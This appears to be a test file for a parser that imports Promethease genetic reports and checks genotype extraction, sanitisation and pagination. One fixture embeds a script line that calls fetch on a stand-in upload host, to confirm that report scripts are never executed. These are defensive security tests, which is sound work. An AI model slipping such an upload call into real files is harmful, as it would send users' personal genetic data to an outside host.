import { expect, test } from "bun:test";
import { deflateSync } from "node:zlib";
import parser from "../src/parsers/promethease";
import { parseFileWithDetection } from "../src/workers/fileParsing";

function report(records: unknown[], extra = "") {
  return `<html><title>Promethease report</title><script>var mygenos=${JSON.stringify(records)};${extra}</script></html>`;
}

function compressed(records: unknown[]) {
  return `mygenos.push.apply(mygenos,decompressString('${deflateSync(JSON.stringify(records)).toString("base64")}'));`;
}

const call = { rsnum: "rs100", was: "(A;G)", geno: "(T;C)", reference: 37, chrom: "1", pos: 123, orientation: "minus" };

test("detects and imports explicit original calls without binding annotation coordinates", async () => {
  const result = await parseFileWithDetection(report([call]), () => {});
  expect(result.detectedFormat).toBe("promethease");
  expect(result.genotypes).toEqual([
    { rsid: "rs100", genotype: "ag", assembly: "GRCh37", chromosome: "", position: "", strand: "unknown" },
  ]);
  expect(result.assembly).toBe("GRCh37");
  expect(result.report?.format).toBe("promethease");
  expect(result.errors).toEqual([]);
});

test("decodes only personal compressed data and never executes report scripts", async () => {
  const source = report(
    [],
    `${compressed([call])}var rsinfo=${JSON.stringify({ rs999: { "(T;T)": { summary: "Example only" } } })};globalThis.__reportExecuted = true;fetch('https://invalid.example/upload');`,
  );
  const result = await parser.parse(source, () => {});
  expect(result.genotypes).toHaveLength(1);
  expect(result.genotypes[0].rsid).toBe("rs100");
  expect(Object.hasOwn(globalThis, "__reportExecuted")).toBe(false);
  expect(result.report?.pages[0].text).not.toContain("rs999");
});

test("retains genosets, HTML summaries, and no-call entries as safe report text", async () => {
  const result = await parser.parse(
    report([
      call,
      { title: "gs100", genosummary: "<b>Genoset summary</b><br>rs999(A;A) &amp; context<script>unsafe()</script>" },
      { rsnum: "rs101", was: "(-;-)", geno: "(-;-)", genosummary: "Missing call" },
    ]),
    () => {},
  );
  expect(result.genotypes).toHaveLength(1);
  expect(result.skippedLines).toBe(2);
  expect(result.report?.pages[0].text).toContain("Genoset summary\nrs999(A;A) & context");
  expect(result.report?.pages[0].text).not.toContain("unsafe()");
  expect(result.report?.pages[0].text).toContain("Missing call");
  expect(result.report?.notes.some((note) => note.includes("1 genoset"))).toBe(true);
});

test("preserves insertion/deletion calls and allele boundaries without interpreting sequences", async () => {
  const result = await parser.parse(
    report([
      { ...call, was: "(D;I)", geno: "(-;AC)" },
      { ...call, rsnum: "i100", was: "(AC;A)", reference: 38 },
    ]),
    () => {},
  );
  expect(result.genotypes[0]).toMatchObject({ genotype: "d/i", alleles: ["d", "i"] });
  expect(result.genotypes[1]).toMatchObject({ genotype: "ac/a", alleles: ["ac", "a"], assembly: "GRCh38" });
  expect(result.assembly).toBeUndefined();
});

test("does not assign an original input build to report-oriented fallback genotypes", async () => {
  const result = await parser.parse(
    report([{ rsnum: "rs100", geno: "(C;T)", reference: 37, chrom: "X", pos: 500, orientation: "plus" }]),
    () => {},
  );
  expect(result.genotypes[0]).toEqual({
    rsid: "rs100",
    genotype: "ct",
    chromosome: "",
    position: "",
    strand: "unknown",
  });
  expect(result.assembly).toBeUndefined();
});

test("combines duplicate calls while preserving conflicting calls and all report entries", async () => {
  const result = await parser.parse(report([call, call, { ...call, was: "(A;A)" }]), () => {});
  expect(result.genotypes).toHaveLength(2);
  expect(result.totalLines).toBe(3);
  expect(result.skippedLines).toBe(1);
  expect(result.report?.pages[0].text.match(/Original genotype:/g)).toHaveLength(3);
});

test("paginates every report record and reports bounded monotonic progress", async () => {
  const events: number[] = [];
  const records = Array.from({ length: 205 }, (_, index) => ({ ...call, rsnum: `rs${100 + index}` }));
  const source = report([], compressed(records.slice(0, 100)) + compressed(records.slice(100)));
  const result = await parser.parse(source, (current, total) => {
    expect(total).toBe(source.length);
    events.push(current);
  });
  expect(result.report?.pages.map((page) => page.page)).toEqual([1, 2, 3]);
  expect(result.genotypes).toHaveLength(205);
  expect(events[0]).toBe(0);
  expect(events.at(-1)).toBe(source.length);
  expect(events.every((value, index) => value >= (events[index - 1] ?? 0) && value <= source.length)).toBe(true);
});

test("plain JSON strings with escaped delimiters cannot escape into executable JavaScript", async () => {
  const result = await parser.parse(
    report([{ ...call, genosummary: 'String with ] and " and \\ remains text' }]),
    () => {},
  );
  expect(result.genotypes).toHaveLength(1);
  expect(result.report?.pages[0].text).toContain('String with ] and " and \\ remains text');
});

test("rejects executable object syntax and malformed or empty embedded data", async () => {
  await expect(parser.parse("Promethease <script>var mygenos=[{rsnum:'rs100'}];</script>", () => {})).rejects.toThrow(
    "JSON data",
  );
  await expect(
    parser.parse(report([], "mygenos.push.apply(mygenos,decompressString('AAAA'));"), () => {}),
  ).rejects.toThrow("Could not decode");
  await expect(parser.parse(report([]), () => {})).rejects.toThrow("no readable");
  await expect(parser.parse(report([null]), () => {})).rejects.toThrow("invalid record");
});

test("unrelated HTML and report prose do not count as personal genotype data", async () => {
  expect(parser.validate("<html>Promethease literature says rs100(A;G)</html>").valid).toBe(false);
  await expect(parser.parse("<html>Promethease literature says rs100(A;G)</html>", () => {})).rejects.toThrow(
    "No embedded",
  );
});
